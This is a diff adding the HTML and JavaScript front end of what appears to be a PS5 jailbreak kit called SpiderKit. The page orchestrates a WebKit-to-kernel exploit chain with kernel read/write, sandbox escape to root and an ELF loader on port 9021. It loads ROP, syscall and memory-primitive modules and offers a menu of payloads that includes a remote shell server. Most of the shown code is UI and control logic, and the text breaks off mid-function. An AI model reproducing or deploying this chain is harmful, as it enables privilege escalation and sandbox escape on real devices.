@@ -1,0 +1,1920 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SpiderKit // Exploit Runtime</title>
+<meta name="theme-color" content="#05070d">
+<link rel="icon" href="../ui/spider-icon-runtime.png" type="image/png">
+
+<script>(function () {
+    var pending = [];
+    window.__jbEarly = pending;
+    function raw(tag, text) {
+        var line = "a0-rboot-s" + (pending.length + 1) + "-note-" + tag
+            + "-" + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
+        pending.push(line);
+        try {
+            var d = document.getElementById("early");
+            if (d) d.textContent += line + "\n";
+        } catch (e) { }
+    }
+    window.__jbRaw = raw;
+    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
+    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
+    window.addEventListener("error", function (e) {
+        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
+            + ":" + (e && e.lineno));
+    });
+    window.addEventListener("unhandledrejection", function (e) {
+        raw("UNHANDLED-REJECTION",
+            e && e.reason && (e.reason.message || e.reason));
+    });
+})();
+</script>
+
+<style>
+  :root {
+    color-scheme: dark;
+    --red:#ff174b; --red2:#ff4f6e; --blue:#3478ff; --green:#45e29a;
+    --ink:#f3f6ff; --muted:#8b97ae; --panel:rgba(9,13,25,.84);
+    --line:rgba(139,161,204,.19);
+  }
+  * { box-sizing:border-box; }
+  html, body { margin:0; min-height:100%; background:#04060c; color:var(--ink); }
+  body {
+    min-height:100vh; padding:22px 24px 28px; overflow:hidden;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    font:16px/1.4 ui-monospace, "SFMono-Regular", Consolas, monospace;
+    background:
+      radial-gradient(circle at 18% 25%, rgba(255,23,75,.17), transparent 30%),
+      radial-gradient(circle at 82% 75%, rgba(52,120,255,.16), transparent 34%),
+      linear-gradient(145deg,#03050a,#080c17 52%,#03040a);
+  }
+  body::before, body::after { content:""; position:fixed; pointer-events:none; }
+  body::before {
+    inset:-45vmax; opacity:.11;
+    background:repeating-radial-gradient(circle at center,transparent 0 70px,rgba(255,255,255,.8) 71px 72px,transparent 73px 128px),repeating-conic-gradient(from 0deg,transparent 0 14deg,rgba(255,255,255,.7) 15deg 15.5deg,transparent 16deg 30deg);
+    transform:rotate(-7deg); -webkit-mask-image:radial-gradient(circle,#000,transparent 69%); mask-image:radial-gradient(circle,#000,transparent 69%);
+  }
+  body::after { inset:0; opacity:.28; background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px); background-size:44px 44px; }
+  body.exploit-running::before,
+  body.exploit-running::after { display:none; }
+  body.exploit-running #cat { filter:none; }
+  body.exploit-running #runtimeHud,
+  body.exploit-running #stage,
+  body.exploit-running #scr { box-shadow:none; }
+  .runtimeBrand {
+    position:fixed; z-index:5; top:22px; left:28px; right:28px;
+    display:flex; align-items:center; justify-content:space-between; pointer-events:none;
+  }
+  .runtimeBrand strong { font:900 13px/1 system-ui,sans-serif; letter-spacing:.18em; }
+  .runtimeBrand strong b { color:var(--red2); }
+  .runtimeBrand span { color:#748099; font:700 9px/1 ui-monospace,Consolas,monospace; letter-spacing:.12em; }
+  .runtimePanel { position:relative; z-index:1; width:min(780px,92vw); display:flex; flex-direction:column; align-items:center; }
+  #cat {
+    position:relative; width:178px; height:178px; margin:0 auto 12px; padding:4px;
+    display:block; flex:0 0 auto; overflow:hidden; border-radius:50%;
+    border:1px solid rgba(255,255,255,.22); background:#fff;
+    filter:drop-shadow(0 24px 34px rgba(0,0,0,.72));
+    transition:filter .2s ease,transform .2s ease;
+  }
+  #cat::before { content:""; position:absolute; inset:12% 8%; border-radius:50%; background:rgba(255,23,75,.2); filter:blur(35px); }
+  #cat img { position:relative; display:block; width:100%; height:100%; object-fit:cover; border-radius:50%; }
+  #cat.ok { filter:drop-shadow(0 0 26px rgba(69,226,154,.55)) drop-shadow(0 24px 34px rgba(0,0,0,.72)); }
+  #cat.bad { filter:grayscale(.35) drop-shadow(0 0 28px rgba(255,23,75,.72)); transform:scale(.96); }
+  h1 { margin:0 0 3px; font:900 20px/1 system-ui,sans-serif; letter-spacing:.16em; }
+  h1 b { color:var(--red2); }
+  .sub { margin:0 0 14px; color:var(--muted); font-size:10px; letter-spacing:.12em; }
+  #runtimeHud { width:100%; margin:0 auto 12px; padding:15px 16px 13px; background:var(--panel); border:1px solid var(--line); border-radius:15px; box-shadow:0 22px 60px rgba(0,0,0,.32),inset 0 1px rgba(255,255,255,.035); }
+  .hudTop { display:flex; align-items:center; justify-content:space-between; gap:20px; margin-bottom:13px; }
+  #phaseLabel { color:#d9dfed; font-size:11px; font-weight:800; letter-spacing:.1em; }
+  .hudLive { display:flex; align-items:center; gap:7px; color:#77839a; font-size:9px; letter-spacing:.1em; }
+  .hudLive i { width:6px; height:6px; border-radius:50%; background:var(--red); box-shadow:0 0 10px var(--red); }
+  #phaseRail { display:grid; grid-template-columns:repeat(5,1fr); gap:7px; }
+  .phase { position:relative; min-width:0; padding-top:8px; border-top:2px solid #273046; color:#59657b; transition:color .15s,border-color .15s; }
+  .phase strong { display:block; overflow:hidden; text-overflow:ellipsis; font-size:9px; letter-spacing:.06em; }
+  .phase span { display:block; margin-top:3px; font-size:8px; opacity:.65; }
+  .phase.done { color:#a7b4ca; border-color:#4366aa; }
+  .phase.active { color:#fff; border-color:var(--red); text-shadow:0 0 12px rgba(255,23,75,.5); }
+  .phase.failed { color:#ff8ba0; border-color:#ff3157; }
+  #stage { width:100%; min-height:44px; margin:0 0 10px; padding:12px 15px; overflow:hidden; text-align:center; text-overflow:ellipsis; white-space:nowrap; border:1px solid var(--line); border-radius:12px; color:#bdc7da; background:rgba(7,10,20,.78); font-size:12px; letter-spacing:.03em; }
+  #stage.ok { color:#baffdd; border-color:rgba(69,226,154,.4); background:rgba(14,75,51,.2); }
+  #stage.bad { color:#ff9bad; border-color:rgba(255,23,75,.48); background:rgba(105,8,31,.24); }
+  #danger,#reboot,#verdict { display:none!important; }
+  #vitals,#cfg,#early { display:none; }
+  #scr { width:100%; height:132px; margin:0; padding:13px 15px; overflow:auto; white-space:pre; color:#8895ab; background:rgba(4,7,14,.82); border:1px solid var(--line); border-radius:13px; font:10px/1.45 ui-monospace,Consolas,monospace; box-shadow:inset 0 1px rgba(255,255,255,.025); }
+  #scr::-webkit-scrollbar { width:4px; } #scr::-webkit-scrollbar-thumb { background:#303b52; border-radius:4px; }
+  #failureMessage { display:none; width:min(780px,92vw); margin:0 auto 12px; padding:12px 16px; color:#ff9caf; background:rgba(95,5,27,.5); border:1px solid rgba(255,45,83,.55); border-radius:12px; text-align:center; font-size:13px; font-weight:900; letter-spacing:.09em; }
+  #failureMessage.on { display:block; }
+  #nav { display:none!important; }
+  #arm { width:min(680px,90vw); padding:18px; color:#f2c886; text-align:center; }
+  #wrap,#tally,#summary { display:none!important; }
+  #payloadMenu { display:none; width:min(900px,92vw); margin:2px auto 30px; }
+  #payloadMenu.on { display:block; }
+  .menuHead { position:relative; display:block; min-height:58px; margin:8px 0 15px; }
+  .menuTitle { display:block; min-height:58px; }
+  .menuTitle::after { content:""; display:block; clear:both; }
+  .menuIcon { float:left; width:52px; height:52px; margin:0 13px 0 0; padding:2px; object-fit:cover; border-radius:50%; border:1px solid rgba(255,255,255,.24); background:#fff; box-shadow:0 0 28px rgba(255,23,75,.22); }
+  .menuTitle > div { display:block; padding-top:7px; }
+  .menuHead p { margin:0 0 5px; color:var(--red2); font:800 9px/1 ui-monospace,Consolas,monospace; letter-spacing:.16em; }
+  .menuHead h2 { margin:0; font:900 26px/1 system-ui,sans-serif; letter-spacing:-.035em; }
+  .menuMeta { position:absolute; top:10px; right:0; display:block; color:#758198; font-size:9px; letter-spacing:.08em; text-align:right; }
+  .menuMeta b,.menuMeta span { display:block; }
+  .menuMeta b { margin-bottom:7px; color:#d7dfef; font-size:10px; letter-spacing:.12em; }
+  .payloadGrid { display:block!important; width:100%; height:auto!important; min-height:300px; margin:0; }
+  .payloadTile {
+    position:relative; display:block!important; width:auto; height:58px;
+    min-height:58px; margin:0 0 7px; padding:6px 88px 6px 72px; overflow:hidden;
+    color:#edf2ff; text-decoration:none!important; background:rgba(10,14,27,.88);
+    border:1px solid var(--line); border-radius:13px;
+    box-shadow:0 16px 35px rgba(0,0,0,.2),inset 0 1px rgba(255,255,255,.035);
+    transition:transform .13s,border-color .13s,background .13s,opacity .13s;
+  }
+  .payloadTile::after { content:""; position:absolute; top:0; bottom:0; left:0; width:3px; background:linear-gradient(var(--red2),#92052b); opacity:.75; }
+  .payloadTile:focus { outline:none; transform:translateY(-2px); border-color:#fff; background:linear-gradient(105deg,rgba(110,6,32,.65),rgba(12,18,34,.92)); box-shadow:0 0 0 3px rgba(255,255,255,.11),0 20px 44px rgba(0,0,0,.34); }
+  .payloadTile.busy { opacity:.35; }
+  .payloadTile[data-state="sending"] { border-color:rgba(52,120,255,.75); }
+  .payloadTile[data-state="sending"]::after { background:var(--blue); }
+  .payloadTile[data-state="sent"] { border-color:rgba(69,226,154,.65); }
+  .payloadTile[data-state="sent"]::after { background:var(--green); }
+  .payloadTile[data-state="failed"] { border-color:rgba(255,23,75,.8); }
+  .payloadIcon { position:absolute; top:5px; left:10px; width:48px; height:48px; display:block; border:1px solid rgba(125,148,195,.24); border-radius:11px; color:#d9e5ff; background:linear-gradient(145deg,#172038,#090e1c); font:900 12px/48px ui-monospace,Consolas,monospace; text-align:center; }
+  .payloadCopy { display:block; min-width:0; padding-top:5px; }
+  .payloadCopy strong { display:block; font:800 13px/1.1 system-ui,sans-serif; letter-spacing:.035em; }
+  .payloadCopy small { display:block; margin-top:6px; color:#748198; font-size:9px; letter-spacing:.04em; }
+  .payloadState { position:absolute; top:15px; right:12px; display:block; min-width:64px; margin:0; padding:7px 8px; border:1px solid var(--line); border-radius:999px; color:#8d9ab0; text-align:center; font-size:8px; font-weight:800; letter-spacing:.08em; }
+  .payloadTile[data-state="sending"] .payloadState { color:#9fc0ff; border-color:rgba(52,120,255,.45); }
+  .payloadTile[data-state="sent"] .payloadState { color:#9ff4cb; border-color:rgba(69,226,154,.4); }
+  .payloadTile[data-state="failed"] .payloadState { color:#ff9fb1; border-color:rgba(255,23,75,.45); }
+  body.loader-ready { justify-content:flex-start; overflow:hidden; padding:0; }
+  body.loader-ready .runtimePanel { width:100%; }
+  body.loader-ready .runtimePanel > #cat,
+  body.loader-ready .runtimePanel > h1,
+  body.loader-ready .runtimePanel > .sub,
+  body.loader-ready .runtimePanel > #runtimeHud,
+  body.loader-ready .runtimePanel > #stage { display:none; }
+  body.loader-ready #scr { display:none; }
+  body.loader-ready #payloadMenu {
+    position:fixed; z-index:6; top:64px; right:3.5vw; bottom:24px; left:3.5vw;
+    width:auto; margin:0; padding:20px; overflow:auto; display:block;
+    border:1px solid rgba(139,161,204,.24); border-radius:18px;
+    background:linear-gradient(145deg,rgba(10,14,27,.97),rgba(5,8,16,.98));
+    box-shadow:0 30px 90px rgba(0,0,0,.52),inset 0 1px rgba(255,255,255,.05);
+  }
+  body.loader-ready .menuHead { margin:0 0 16px; }
+  body.loader-ready .payloadGrid { display:block!important; }
+  body.loader-ready #dt { display:none; }
+  #dt { position:fixed; right:20px; bottom:18px; z-index:9; padding:8px 10px; color:#566177; background:rgba(7,10,19,.8); border:1px solid var(--line); border-radius:8px; font:700 9px/1 ui-monospace,Consolas,monospace; }
+  #dt:focus { outline:2px solid #fff; }
+  @media(max-width:900px) {
+    body.loader-ready #payloadMenu { top:58px; right:18px; bottom:18px; left:18px; padding:16px; }
+  }
+  @media(max-width:680px) {
+    body { padding-left:14px; padding-right:14px; }
+    .runtimeBrand { left:16px; right:16px; }
+    #cat { width:138px; height:155px; }
+    #phaseRail { gap:4px; } .phase strong { font-size:7px; } .phase span { display:none; }
+    .menuMeta { display:none; }
+    body.loader-ready #payloadMenu { top:54px; right:12px; bottom:12px; left:12px; padding:14px; }
+  }
+  @media(max-height:650px) {
+    body.loader-ready #payloadMenu { top:50px; right:14px; bottom:10px; left:14px; padding:12px; }
+    body.loader-ready .menuHead { margin-bottom:10px; }
+    .menuHead,.menuTitle { min-height:46px; }
+    .menuIcon { width:44px; height:44px; }
+    .menuTitle > div { padding-top:3px; }
+    .menuHead h2 { font-size:22px; }
+    .payloadGrid { min-height:270px; }
+    .payloadTile { height:51px; min-height:51px; margin-bottom:4px; padding:4px 82px 4px 62px; }
+    .payloadIcon { top:4px; left:7px; width:42px; height:42px; line-height:42px; }
+    .payloadCopy { padding-top:4px; }
+    .payloadState { top:11px; right:8px; }
+    .payloadCopy small { display:none; }
+  }
+  @media(prefers-reduced-motion:reduce) { * { transition:none!important; } }
+</style>
+</head>
+<body class="quiet">
+<div class="runtimeBrand"><strong>SPIDER<b>//</b>KIT</strong><span>PS5 EXPLOIT RUNTIME</span></div>
+<div id="failureMessage">CHAIN BROKEN // REBOOT REQUIRED</div>
+<main class="runtimePanel">
+<div id="cat"><img id="catImage" src="../ui/spider-icon-runtime.png" alt="SpiderKit runtime mask"></div>
+<h1>SPIDER<b>//</b>KIT</h1>
+<p class="sub">NETCONTROL CHAIN MONITOR</p>
+<section id="runtimeHud" aria-label="Exploit progress">
+  <div class="hudTop"><span id="phaseLabel">CHAIN INITIALIZATION</span><span class="hudLive"><i></i> LIVE RUNTIME</span></div>
+  <div id="phaseRail">
+    <div class="phase active"><strong>WEBKIT</strong><span>01 / ENTRY</span></div>
+    <div class="phase"><strong>KERNEL</strong><span>02 / TRIGGER</span></div>
+    <div class="phase"><strong>KERNEL R/W</strong><span>03 / PIPE</span></div>
+    <div class="phase"><strong>ROOT</strong><span>04 / ESCAPE</span></div>
+    <div class="phase"><strong>ELF LOADER</strong><span>05 / :9021</span></div>
+  </div>
+</section>
+<div id="reboot"></div>
+<div id="verdict"></div>
+<div id="danger"></div>
+<div id="stage">idle</div>
+<div id="vitals"></div>
+<div id="cfg"></div>
+<pre id="early"></pre>
+<pre id="scr"></pre>
+<div id="payloadMenu">
+  <div class="menuHead">
+    <div class="menuTitle"><img class="menuIcon" src="../ui/spider-icon-runtime.png" alt=""><div><p>ELF LOADER ONLINE</p><h2>SELECT A PAYLOAD</h2></div></div>
+    <div class="menuMeta"><b>PRESS × TO SEND</b><span>LOCAL TARGET 127.0.0.1:9021 // UI 32</span></div>
+  </div>
+  <div class="payloadGrid" style="display:block;width:100%;height:auto;min-height:300px">
+    <a class="payloadTile" style="display:block" href="#" data-name="ftpsrv-ps5.elf" data-key="ftp" data-state="default"><span class="payloadIcon">FTP</span><span class="payloadCopy"><strong>FTP Server</strong><small>Browse and transfer console files</small></span><span class="payloadState">READY</span></a>
+    <a class="payloadTile" style="display:block" href="#" data-name="gdbsrv-ps5.elf" data-key="gdb" data-state="default"><span class="payloadIcon">GDB</span><span class="payloadCopy"><strong>GDB Server</strong><small>Attach a remote debugging client</small></span><span class="payloadState">READY</span></a>
+    <a class="payloadTile" style="display:block" href="#" data-name="klogsrv-ps5.elf" data-key="klog" data-state="default"><span class="payloadIcon">LOG</span><span class="payloadCopy"><strong>Kernel Log</strong><small>Stream low-level runtime messages</small></span><span class="payloadState">READY</span></a>
+    <a class="payloadTile" style="display:block" href="#" data-name="shsrv-ps5.elf" data-key="shell" data-state="default"><span class="payloadIcon">&gt;_</span><span class="payloadCopy"><strong>Shell Server</strong><small>Open the remote command service</small></span><span class="payloadState">READY</span></a>
+    <a class="payloadTile" style="display:block" href="#" data-name="websrv-ps5.elf" data-key="web" data-state="default"><span class="payloadIcon">WEB</span><span class="payloadCopy"><strong>Web Server</strong><small>Start the local HTTP service</small></span><span class="payloadState">READY</span></a>
+  </div>
+</div>
+<div id="nav"></div>
+<div id="arm" hidden>Open this page with <b>?go=1</b> to arm it. Nothing runs
+otherwise.</div>
+<div id="wrap">
+<table>
+  <thead><tr><th>#</th><th>test</th><th>st</th><th>result</th></tr></thead>
+  <tbody id="rows"></tbody>
+</table>
+</div>
+<div id="tally"></div>
+<div id="summary"></div>
+</main>
+
+<div id="console" hidden></div>
+
+<script src="rop.js"></script>
+<script src="main.js?v=16"></script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="../offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js"></script>
+
+<script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js?v=10";
+import { int64 } from "./int64.js";
+import { BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList }
+    from "./poops.js?v=16";
+
+let PK = null, makePoopsEngine = null, buildLadder = null;
+
+async function loadPoopsModules() {
+    const lib = await import("./poops.js?v=16");
+    PK = lib.PK;
+    makePoopsEngine = lib.makePoopsEngine;
+    buildLadder = lib.buildLadder;
+    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive");
+}
+
+const Q = new URLSearchParams(location.search);
+const ARMED = Q.get("go") === "1";
+const CLEARLATCH = Q.get("clear") === "1";
+
+const AUTOCLEAR = Q.get("auto") === "1";
+const FROM = Q.get("from") || "";
+const ONLY = (Q.get("only") || "").split(",").map(s => s.trim()).filter(Boolean);
+const FILTERED_RUN = ONLY.length > 0 || FROM !== "";
+const MAX_ATTEMPTS = parseInt(Q.get("max") || "0", 10) || 0;
+const CORE_OVERRIDE = Q.has("core") ? parseInt(Q.get("core"), 10) : -1;
+
+const PROGRESS_KEY = "slopkit-poops:next";
+const RUNLOG_KEY = "slopkit-poops:last";
+const REV = "slopkit-poops-32-payload-block-fallback";
+
+function storeGet(k) {
+    try { return sessionStorage.getItem(k) || ""; } catch { return ""; }
+}
+function storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }
+function storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }
+function storeJson(k) {
+    const raw = storeGet(k);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+}
+const STALLED_AT = storeGet(PROGRESS_KEY);
+const LAST_RUN = storeJson(RUNLOG_KEY);
+
+const TRIGGER = (() => {
+    const t = (Q.get("trigger") || "none").toLowerCase();
+    return (t === "netcontrol" || t === "overflow") ? t : "none";
+})();
+const BURN = (() => {
+    const b = (Q.get("burn") || "probe").toLowerCase();
+    return (b === "none" || b === "full") ? b : "probe";
+})();
+const DEFAULT_ATTEMPTS = TRIGGER === "overflow" ? 96
+    : TRIGGER === "netcontrol" ? 8 : 1;
+
+const cfg = {
+
+    payload: Q.get("payload") || "",
+    trigger: TRIGGER,
+    burn: BURN,
+    netprobe: Q.get("netprobe") === "1",
+    sockets: Math.max(4, Math.min(128,
+        parseInt(Q.get("sockets") || "", 10) || 80)),
+    attempts: Math.max(1, Math.min(512,
+        parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
+    kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
+    kqRounds: Math.max(8, Math.min(50000,
+        parseInt(Q.get("kqrounds") || "", 10) || 5000)),
+    kqConfirm: Q.get("noconfirm") !== "1",
+    burnRounds: Math.max(1, Math.min(100000,
+        parseInt(Q.get("burnrounds") || "", 10) || 20)),
+    burnUnroll: Math.max(1, Math.min(512,
+        parseInt(Q.get("burnunroll") || "", 10) || 512)),
+
+    twinDeadlineMs: 20000,
+    reclaimDeadlineMs: 30000,
+    tripletDeadlineMs: 30000,
+    repairDeadlineMs: 30000,
+    stage0DeadlineMs: Math.max(30000, Math.min(900000,
+        parseInt(Q.get("stage0deadline") || "", 10) || 300000)),
+    stage1DeadlineMs: 120000,
+    stage2Attempts: 5,
+
+    stage2DeadlineMs: Math.max(60000, Math.min(3600000,
+        parseInt(Q.get("stage2deadline") || "", 10) || 900000))
+};
+
+let elfldrSpawned = false;
+const screenLines = [];
+
+const SCREEN_LINES = 22;
+const scrEl = document.getElementById("scr");
+
+const clean = s => String(s).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+
+let raceMode = false;
+let screenDirty = false;
+let pendingHudTag = "";
+let pendingHudDetail = "";
+
+const SCREEN_MS = 250;
+let lastPaint = 0;
+
+const CRITICAL_MARKS = { "TRIGGER-ARMED": 1, "LATCH-ESCALATE": 1 };
+function repaintScreen() {
+    if (!screenDirty) return;
+    screenDirty = false;
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+function setRaceMode(on) {
+    const was = raceMode;
+    raceMode = !!on;
+    if (was && !raceMode) {
+        if (pendingHudTag) {
+            updateHudFromTag(pendingHudTag, pendingHudDetail);
+            pendingHudTag = "";
+            pendingHudDetail = "";
+        }
+        repaintScreen();
+    }
+    return was;
+}
+function screenLine(text) {
+    screenLines.push(text.length > 120 ? text.slice(0, 117) + "..." : text);
+    if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+
+    if (raceMode) {
+        screenDirty = true;
+        const nowMs = Date.now();
+        if (nowMs - lastPaint < SCREEN_MS) return;
+        lastPaint = nowMs;
+        screenDirty = false;
+    }
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+
+const SCREEN_SHOW = /^(STAGE[1-5]-|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE)/;
+const HUD_DEFER_MARKS = /^(LATCH-|OFFSETS-|WEBKIT-|PRIMITIVE-|PREP-|MODULE-BASES|STAGE[0-5]-|TRIGGER-|SOCKETS|SPAWN|WAKEGATE|ALIASES-REPAIRED|ALLPROC-CHECK|ELF-)/;
+
+const phaseLabelEl = document.getElementById("phaseLabel");
+const phaseEls = document.getElementById("phaseRail").getElementsByClassName("phase");
+function setHudPhase(index, label, failed) {
+    const phase = Math.max(1, Math.min(5, index || 1));
+    for (let i = 0; i < phaseEls.length; ++i) {
+        phaseEls[i].className = "phase"
+            + (i + 1 < phase ? " done" : "")
+            + (i + 1 === phase ? (failed ? " failed" : " active") : "");
+    }
+    if (phaseLabelEl && label) phaseLabelEl.textContent = label;
+}
+function failCurrentHud(label) {
+    let phase = 1;
+    for (let i = 0; i < phaseEls.length; ++i)
+        if (/\bactive\b/.test(phaseEls[i].className)) phase = i + 1;
+    setHudPhase(phase, label, true);
+}
+function updateHudFromTag(tag, detail) {
+    let phase = 0;
+    let label = "";
+    if (/^(LATCH-|OFFSETS-|WEBKIT-|PRIMITIVE-|PREP-|MODULE-BASES)/.test(tag)) {
+        phase = 1; label = "WEBKIT // MEMORY PRIMITIVE";
+    } else if (/^(STAGE[0-2]-|TRIGGER-|SOCKETS|SPAWN|WAKEGATE)/.test(tag)) {
+        phase = 2; label = "KERNEL // TRIGGER & RECLAIM";
+    } else if (/^(STAGE3-|ALIASES-REPAIRED)/.test(tag)) {
+        phase = 3; label = "KERNEL R\/W // PIPE PRIMITIVE";
+    } else if (/^(STAGE4-|ALLPROC-CHECK)/.test(tag)) {
+        phase = 4; label = "ROOT // SANDBOX ESCAPE";
+    } else if (/^(STAGE5-|ELF-)/.test(tag)) {
+        phase = 5; label = "ELF LOADER // LOCAL PORT 9021";
+    }
+    if (!phase) return;
+    const failed = /FAIL|FAILED|REBOOT/.test(tag + " " + (detail || ""));
+    setHudPhase(phase, label, failed);
+}
+
+function screenMark(tag, extra) {
+    const s0 = extra == null ? "" : String(extra);
+    if (raceMode) {
+        if (HUD_DEFER_MARKS.test(tag)) {
+            pendingHudTag = tag;
+            pendingHudDetail = s0;
+        }
+    } else {
+        updateHudFromTag(tag, s0);
+    }
+    let line;
+    if (tag === "TEST") {
+
+        const m = /-why(=|%3D)/.exec(s0);
+        const i = m ? m.index : -1;
+        const head = i < 0 ? s0 : s0.slice(0, i);
+        line = head.replace(/-/, " ");
+        if (i >= 0 && /FAIL/.test(head))
+            line += ": " + s0.slice(i + m[0].length).replace(/_/g, " ");
+    } else if (tag === "TEST-ENTER") {
+
+        line = "> " + s0.replace(/-chainMarks.*$/, "").replace(/-/, " ");
+    } else if (SCREEN_SHOW.test(tag) && !tag.endsWith("-PRE")) {
+        line = s0 ? tag + " " + s0.replace(/_/g, " ") : tag;
+    } else return;
+    if (tag === "STAGE5-DONE" && /(?:^|-)joinRet=0(?:-|$)/.test(s0) &&
+        /(?:^|-)shellcodeRet=0x0+(?:-|$)/.test(s0)) {
+        elfldrSpawned = true;
+        document.body.classList.add("loader-ready");
+        clearFailureBanners();
+        setCatResult(true);
+        setHudPhase(5, "ELF LOADER ONLINE // PORT 9021", false);
+        showVerdict(false, "ELF LOADER READY");
+        stage("ELF LOADER READY", "ok");
+    }
+    if (line.length > 110) line = line.slice(0, 107) + "...";
+    screenLine(line);
+    catState(tag, s0);
+}
+
+function catState(tag, extra) {
+    try {
+        const c = document.getElementById("cat");
+        if (!c) return;
+        if (elfldrSpawned) { c.className = "ok"; return; }
+        if (tag !== "POOPS-COMPLETE") return;
+        const m = /-fail=(\d+)/.exec(extra || "");
+        const failed = m ? parseInt(m[1], 10) : 1;
+        c.className = failed === 0 ? "ok" : "bad";
+    } catch (e) { }
+}
+
+let marksQueued = 0;
+let marksBlocked = 0;
+const markStats = () => ({ queued: marksQueued, blocked: marksBlocked });
+function queueEvent(tag, extra) {
+    marksQueued++;
+    screenMark(tag, extra);
+}
+function flushQueue() { repaintScreen(); }
+
+function flushMark(tag, extra) {
+
+    if (raceMode && CRITICAL_MARKS[tag] !== 1) { queueEvent(tag, extra); return; }
+    marksBlocked++;
+    screenMark(tag, extra);
+}
+
+const LATCH_KEY = "slopkit-poops:latch";
+let latchState = storeGet(LATCH_KEY) ? "held" : "clear";
+const latch = {
+    async read() {
+        const detail = storeGet(LATCH_KEY);
+        latchState = detail ? "held" : "clear";
+        return { set: detail ? 1 : 0, detail };
+    },
+    async set(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-SET", d);
+        storeSet(LATCH_KEY, d || "set");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async escalate(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-ESCALATE", d);
+        storeSet(LATCH_KEY, d || "escalated");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async clear() {
+        flushMark("LATCH-CLEAR", "operator-request");
+        storeDel(LATCH_KEY);
+        latchState = "clear";
+        return { set: 0, detail: "" };
+    }
+};
+
+const stageEl = document.getElementById("stage");
+const dangerEl = document.getElementById("danger");
+const rebootEl = document.getElementById("reboot");
+const verdictEl = document.getElementById("verdict");
+const vitalsEl = document.getElementById("vitals");
+const cfgEl = document.getElementById("cfg");
+const rowsEl = document.getElementById("rows");
+const tallyEl = document.getElementById("tally");
+const summaryEl = document.getElementById("summary");
+const navEl = document.getElementById("nav");
+const payloadMenuEl = document.getElementById("payloadMenu");
+const rowByKey = new Map();
+let payloadSendBusy = false;
+const PAYLOAD_PORT = 9021;
+const PAYLOAD_BUFFER_SIZE = 0x10000;
+const PAYLOAD_MAX_SIZE = 0x200000;
+let payloadSendStore = null;
+let payloadSockaddrStore = null;
+let payloadSocketOptionStore = null;
+let payloadSendTimeoutStore = null;
+let payloadSenderBlocked = "";
+
+function showPayloadMenu() {
+    navEl.textContent = "";
+    navEl.style.display = "none";
+    document.body.classList.add("loader-ready");
+    payloadMenuEl.className = "on";
+    payloadMenuEl.style.display = "block";
+    payloadMenuEl.style.visibility = "visible";
+    const grid = payloadMenuEl.getElementsByClassName("payloadGrid")[0];
+    if (grid) {
+        grid.style.display = "block";
+        grid.style.width = "100%";
+        grid.style.height = "auto";
+        grid.style.minHeight = "300px";
+    }
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i) {
+        tiles[i].style.display = "block";
+        tiles[i].style.visibility = "visible";
+    }
+    if (!payloadMenuEl.__controllerNav) {
+        payloadMenuEl.addEventListener("keydown", function (event) {
+            const key = event.key || "";
+            if (!/^Arrow(Left|Right|Up|Down)$/.test(key)
+                && key !== "Home" && key !== "End") return;
+            const links = payloadMenuEl.getElementsByTagName("a");
+            let current = 0;
+            for (let i = 0; i < links.length; ++i)
+                if (links[i] === document.activeElement) current = i;
+            const columns = 1;
+            let next = current;
+            if (key === "ArrowLeft") next = Math.max(0, current - 1);
+            if (key === "ArrowRight") next = Math.min(links.length - 1, current + 1);
+            if (key === "ArrowUp") next = Math.max(0, current - columns);
+            if (key === "ArrowDown") next = Math.min(links.length - 1, current + columns);
+            if (key === "Home") next = 0;
+            if (key === "End") next = links.length - 1;
+            event.preventDefault();
+            try { links[next].focus(); } catch (e) { }
+        });
+        for (let i = 0; i < tiles.length; ++i) {
+            tiles[i].addEventListener("focus", function () {
+                try {
+                    this.scrollIntoView({ block: "nearest", inline: "nearest" });
+                } catch (e) {
+                    try { this.scrollIntoView(false); } catch (ignored) { }
+                }
+            });
+        }
+        payloadMenuEl.__controllerNav = true;
+    }
+    if (tiles.length) try { tiles[0].focus(); } catch (e) { }
+}
+
+function setPayloadTileState(tile, state) {
+    const labels = { "default": "READY", "sending": "SENDING", "sent": "SENT", "failed": "FAILED" };
+    tile.setAttribute("data-state", state);
+    const status = tile.getElementsByClassName("payloadState")[0];
+    if (status) status.textContent = labels[state] || String(state).toUpperCase();
+}
+
+function payloadIsListed(name) {
+    if (!/^[A-Za-z0-9._-]+\.elf$/.test(name)) return false;
